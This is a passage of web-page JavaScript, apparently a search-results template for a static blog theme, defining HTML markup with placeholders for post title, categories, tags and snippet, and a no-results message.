pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
